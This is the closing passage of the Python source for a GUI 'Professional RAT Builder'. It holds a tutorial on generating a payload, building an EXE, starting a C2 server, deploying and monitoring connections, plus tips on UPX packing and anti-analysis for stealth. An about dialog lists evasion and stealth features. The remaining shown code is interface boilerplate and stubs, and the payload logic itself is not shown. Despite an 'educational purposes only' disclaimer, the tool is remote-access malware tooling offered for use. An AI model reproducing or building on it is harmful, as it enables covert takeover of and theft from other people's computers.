1. Go to Build tab
2. Set output directory
3. Click Generate Payload
4. Click Build EXE

STEP 5: TEST & DEPLOY
1. Test payload in safe mode
2. Start C2 server
3. Deploy payload
4. Monitor connections

TIPS:
• Use UPX packing to reduce size
• Enable anti-analysis for better stealth
• Test thoroughly before deployment
"""
        
        top = tk.Toplevel(self.root)
        top.title("Tutorial")
        top.geometry("500x400")
        
        text = scrolledtext.ScrolledText(top, wrap=tk.WORD)
        text.pack(fill="both", expand=True, padx=10, pady=10)
        text.insert("1.0", tutorial)
    
    def _check_updates(self):
        """Check for updates"""
        self._log("Update check not implemented", "INFO")
        messagebox.showinfo("Updates", "Automatic update check not implemented.\n"
                                      "Check GitHub for latest version.")
    
    def _show_about(self):
        """Show about dialog"""
        about = f"""{APP_NAME}
Version: {VERSION}
Build Date: {BUILD_DATE}
Author: {AUTHOR}
License: {LICENSE}

Description:
Professional RAT Builder with complete GUI, advanced features,
evasion techniques, and .EXE output generation.

Features:
• Complete GUI with multiple themes
• Advanced payload generation
• 20+ feature modules
• 15+ evasion techniques  
• 15+ stealth techniques
• C2 server integration
• Professional build system

Warning:
For educational and testing purposes only.
Use only on systems you own or have permission to test.

© 2024 Security Research Team
"""
        
        messagebox.showinfo(f"About {APP_NAME}", about)
    
    def _undo(self):
        """Undo action"""
        self._log("Undo not implemented", "WARNING")
    
    def _redo(self):
        """Redo action"""
        self._log("Redo not implemented", "WARNING")
    
    def _cut(self):
        """Cut"""
        self._log("Cut not implemented", "WARNING")
    
    def _copy(self):
        """Copy"""
        self._log("Copy not implemented", "WARNING")
    
    def _paste(self):
        """Paste"""
        self._log("Paste not implemented", "WARNING")
    
    def _select_all(self):
        """Select all"""
        self._log("Select all not implemented", "WARNING")
    
    def _find(self):
        """Find"""
        self._log("Find not implemented", "WARNING")
    
    def _clear_logs(self):
        """Clear logs"""
        self.log_text.delete("1.0", tk.END)
        self._log("Logs cleared")
    
    def _save_logs(self):
        """Save logs to file"""
        filetypes = [("Text files", "*.txt"), ("Log files", "*.log"), ("All files", "*.*")]
        path = filedialog.asksaveasfilename(
            defaultextension=".log",
            filetypes=filetypes,
            initialfile="purat.log"
        )
        
        if path:
            try:
                with open(path, 'w', encoding='utf-8') as f:
                    f.write(self.log_text.get("1.0", tk.END))
                self._log(f"Logs saved to {path}")
            except Exception as e:
                self._log(f"Failed to save logs: {e}", "ERROR")
    
    def _copy_logs(self):
        """Copy logs to clipboard"""
        self.root.clipboard_clear()
        self.root.clipboard_append(self.log_text.get("1.0", tk.END))
        self._log("Logs copied to clipboard")
    
    def run(self):
        """Run the application"""
        try:
            self.root.mainloop()
        except Exception as e:
            print(f"Application error: {e}")

# ============================================================================
# MAIN EXECUTION
# ============================================================================

def main():
    """Main entry point"""
    print(f"""
    ╔══════════════════════════════════════════════════════════════════════╗
    ║                           {APP_NAME}                           ║
    ║                  Professional Edition - 3000+ Lines                  ║
    ║                       For Educational Testing Only                   ║
    ║                     Build Date: {BUILD_DATE}                     ║
    ╚══════════════════════════════════════════════════════════════════════╝
    """)
    
    # Check Python version
    if sys.version_info < MIN_PYTHON_VERSION:
        print(f"Python {MIN_PYTHON_VERSION[0]}.{MIN_PYTHON_VERSION[1]} or higher required")
        return
    
    # Check OS
    current_os = platform.system()
    if current_os not in SUPPORTED_OS:
        print(f"Warning: {current_os} is not officially supported")
    
    # Check for GUI libraries
    try:
        import tkinter as tk
        from tkinter import ttk, scrolledtext, messagebox, filedialog, simpledialog
        GUI_AVAILABLE = True
    except ImportError:
        GUI_AVAILABLE = False
        print("GUI libraries not available. Tkinter is required.")
        print("Install with: sudo apt-get install python3-tk (Linux)")
        print("              or download from python.org (Windows)")
        return
    
    # Run application
    try:
        app = ProfessionalRATBuilder()
        app.run()
    except Exception as e:
        print(f"Fatal error: {e}")
        traceback.print_exc()

if __name__ == "__main__":
    main()
